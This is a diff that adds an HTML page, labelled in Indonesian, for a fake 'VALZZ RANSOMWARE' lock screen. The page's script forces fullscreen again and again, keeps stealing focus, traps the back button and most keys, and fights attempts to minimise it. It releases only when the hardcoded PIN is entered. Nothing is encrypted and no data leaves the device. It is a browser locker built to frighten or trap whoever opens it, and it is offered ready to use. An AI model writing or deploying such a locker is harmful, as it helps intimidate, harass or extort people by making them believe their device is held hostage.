@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LOCKED</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+        
+        body {
+            width: 100%;
+            height: 100vh;
+            height: 100dvb;
+            background: #8b0000;
+            background: linear-gradient(145deg, #6a0000, #2a0000);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, Helvetica, sans-serif;
+            overflow: hidden;
+            position: fixed;
+        }
+        
+        .card {
+            width: 94%;
+            max-width: 360px;
+            background: #1a0000;
+            border: 3px solid #ff3333;
+            border-radius: 35px;
+            padding: 25px 18px;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.6);
+            margin: 0 auto;
+        }
+        
+        .emoji-besar {
+            font-size: 70px;
+            text-align: center;
+            line-height: 1;
+            margin-bottom: 5px;
+        }
+        
+        h1 {
+            color: white;
+            font-size: 36px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 2px;
+            text-shadow: 0 0 15px red;
+        }
+        
+        .label {
+            color: #ffaaaa;
+            text-align: center;
+            background: #330000;
+            padding: 6px 15px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 0 auto 18px;
+            font-size: 14px;
+            border: 1px solid #ff6666;
+        }
+        
+        .kotak-info {
+            background: #220000;
+            border: 2px solid #cc0000;
+            border-radius: 25px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .baris-info {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #440000;
+            color: white;
+            font-size: 15px;
+        }
+        
+        .baris-info:last-child {
+            border-bottom: none;
+        }
+        
+        .teks-merah {
+            color: #ff7777;
+            font-weight: bold;
+        }
+        
+        .area-pin {
+            margin-bottom: 20px;
+        }
+        
+        .teks-pin {
+            color: #ffcccc;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .input-pin {
+            width: 100%;
+            background: black;
+            border: 3px solid #ff3333;
+            border-radius: 60px;
+            padding: 16px 15px;
+            color: white;
+            font-size: 30px;
+            font-weight: bold;
+            text-align: center;
+            letter-spacing: 10px;
+            outline: none;
+            font-family: monospace;
+        }
+        
+        .input-pin::placeholder {
+            color: #442222;
+            letter-spacing: 4px;
+            font-size: 16px;
+        }
+        
+        .tombol {
+            width: 100%;
+            background: #cc0000;
+            border: none;
+            border-radius: 60px;
+            padding: 16px 0;
+            color: white;
+            font-weight: bold;
+            font-size: 24px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border: 2px solid #ffaaaa;
+            box-shadow: 0 4px 0 #550000;
+            margin-bottom: 15px;
+        }
+        
+        .tombol:active {
+            transform: translateY(3px);
+            box-shadow: 0 1px 0 #550000;
+        }
+        
+        .footer {
+            text-align: center;
+            color: #884444;
+            font-size: 11px;
+        }
+        
+        .popup-error {
+            position: fixed;
+            top: 30%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            background: black;
+            border: 3px solid red;
+            border-radius: 40px;
+            padding: 12px 25px;
+            color: red;
+            font-weight: bold;
+            z-index: 9999;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+        
+        .popup-error.tampil {
+            transform: translate(-50%, -50%) scale(1);
+        }
+        
+        .layar-sukses {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #004d00;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+        }
+        
+        .kotak-sukses {
+            background: #006600;
+            border: 5px solid #00ff00;
+            border-radius: 60px;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .centang {
+            font-size: 80px;
+        }
+        
+        .teks-sukses {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .loading {
+            width: 30px;
+            height: 30px;
+            border: 4px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            margin: 15px auto 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="popup-error" id="errorPopup">⚠️ SALAH ⚠️</div>
+    
+    <div class="card" id="mainCard">
+        <div class="emoji-besar">🔒💀🔒</div>
+        <h1>LOCKED</h1>
+        <div class="label">VALZZ RANSOMWARE</div>
+        
+        <div class="kotak-info">
+            <div class="baris-info">
+                <span>BACK</span>
+                <span class="teks-merah">BLOKIR</span>
+            </div>
+            <div class="baris-info">
+                <span>HOME</span>
+                <span class="teks-merah">BLOKIR</span>
+            </div>
+            <div class="baris-info">
+                <span>POWER</span>
+                <span class="teks-merah">BLOKIR</span>
+            </div>
+            <div class="baris-info">
+                <span>VOLUME</span>
+                <span class="teks-merah">BLOKIR</span>
+            </div>
+            <div class="baris-info">
+                <span>RESTART</span>
+                <span class="teks-merah">TETAP</span>
+            </div>
+        </div>
+        
+        <div class="area-pin">
+            <div class="teks-pin">🔑 MASUKKAN PIN 6 DIGIT</div>
+            <input type="tel" id="pinInput" class="input-pin" maxlength="6" inputmode="numeric" placeholder="000000" autofocus>
+        </div>
+        
+        <button class="tombol" onclick="cekPin()">UNLOCK</button>
+        <div class="footer">⚡ VALZZ ⚡</div>
+    </div>
+
+    <script>
+        // GANTI PIN DISINI
+        const PIN_BENAR = "123456";
+        
+        if (localStorage.getItem('unlock') === 'ok') {
+            document.getElementById('mainCard').style.display = 'none';
+        } else {
+            mulaiKunci();
+        }
+        
+        function mulaiKunci() {
+            let inputPin = document.getElementById('pinInput');
+            
+            // FOKUS TERUS
+            setInterval(() => {
+                inputPin.focus();
+                inputPin.click();
+            }, 300);
+            
+            // FULLSCREEN
+            setInterval(() => {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                }
+            }, 1000);
+            
+            // BACK BUTTON
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, location.href);
+                tampilError('BACK BLOKIR');
+            });
+            
+            // ANDROID BACK
+            document.addEventListener('backbutton', function(e) {
+                e.preventDefault();
+                tampilError('BACK BLOKIR');
+            }, false);
+            
+            // TOMBOL FISIK
+            document.addEventListener('keydown', function(e) {
+                if ((e.key >= '0' && e.key <= '9') || e.key === 'Backspace') {
+                    return true;
+                }
+                e.preventDefault();
+                return false;
+            }, true);
+            
+            // ANTI MINIMIZE
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    setTimeout(() => {
+                        window.focus();
+                        inputPin.focus();
+                    }, 10);
+                }
+            });
+        }
+        
+        function cekPin() {
+            let pin = document.getElementById('pinInput').value;
+            
+            if (pin === PIN_BENAR) {
+                // SUKSES
+                document.body.innerHTML += `
+                    <div class="layar-sukses" id="sukses">
+                        <div class="kotak-sukses">
+                            <div class="centang">✅</div>
+                            <div class="teks-sukses">UNLOCKED</div>
+                            <div style="color: #aaffaa;">Tutup...</div>
+                            <div class="loading"></div>
+                        </div>
+                    </div>
+                `;
+                
+                localStorage.setItem('unlock', 'ok');
+                
+                setTimeout(() => {
+                    window.close();
+                    document.body.innerHTML = '';
+                }, 2000);
+                
+            } else {
+                // SALAH
+                document.getElementById('pinInput').value = '';
+                document.querySelector('.card').style.transform = 'translateX(5px)';
+                setTimeout(() => {
+                    document.querySelector('.card').style.transform = 'translateX(-5px)';
+                }, 50);
+                setTimeout(() => {
+                    document.querySelector('.card').style.transform = 'translateX(0)';
+                }, 100);
+                
+                tampilError('PIN SALAH');
+            }
+        }
+        
+        function tampilError(teks) {
+            let pop = document.getElementById('errorPopup');
+            pop.innerHTML = '⚠️ ' + teks + ' ⚠️';
+            pop.classList.add('tampil');
+            
+            setTimeout(() => {
+                pop.classList.remove('tampil');
+            }, 1000);
+        }
+        
+        // ENTER
+        document.getElementById('pinInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                cekPin();
+            }
+        });
+    </script>
+</body>
+</html>
